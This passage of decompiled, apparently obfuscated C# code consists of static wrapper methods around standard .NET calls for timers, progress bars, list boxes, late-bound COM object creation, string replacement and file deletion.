	}

	static string smethod_37(string string_0, string string_1, string string_2)
	{
		return string_0 + string_1 + string_2;
	}

	static void smethod_38(Timer timer_1)
	{
		timer_1.Start();
	}

	static object smethod_39(string string_0, string string_1)
	{
		return Interaction.CreateObject(string_0, string_1);
	}

	static object smethod_40(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static object smethod_41(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1, bool[] bool_0, bool bool_1)
	{
		return NewLateBinding.LateCall(object_0, type_0, string_0, object_1, string_1, type_1, bool_0, bool_1);
	}

	static void smethod_42(ProgressBar progressBar_0, int int_0)
	{
		progressBar_0.set_Value(int_0);
	}

	static int smethod_43(ObjectCollection objectCollection_0)
	{
		return objectCollection_0.get_Count();
	}

	static void smethod_44(ProgressBar progressBar_0, int int_0)
	{
		progressBar_0.set_Maximum(int_0);
	}

	static int smethod_45(ProgressBar progressBar_0)
	{
		return progressBar_0.get_Value();
	}

	static void smethod_46(Timer timer_1)
	{
		timer_1.Stop();
	}

	static void smethod_47()
	{
		Application.ExitThread();
	}

	static void smethod_48(ListBox listBox_0, int int_0)
	{
		listBox_0.set_SelectedIndex(int_0);
	}

	static void smethod_49(ListBox listBox_0, SelectionMode selectionMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		listBox_0.set_SelectionMode(selectionMode_0);
	}

	static object smethod_50(ListBox listBox_0)
	{
		return listBox_0.get_SelectedItem();
	}

	static string smethod_51(object object_0)
	{
		return Conversions.ToString(object_0);
	}

	static string smethod_52(string string_0, string string_1, string string_2, int int_0, int int_1, CompareMethod compareMethod_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		return Strings.Replace(string_0, string_1, string_2, int_0, int_1, compareMethod_0);
	}

	static void smethod_53(FileSystemProxy fileSystemProxy_0, string string_0)
	{
		fileSystemProxy_0.DeleteFile(string_0);
	}

	static void smethod_54(ProgressBar progressBar_0, int int_0)
	{
		progressBar_0.Increment(int_0);
	}
}
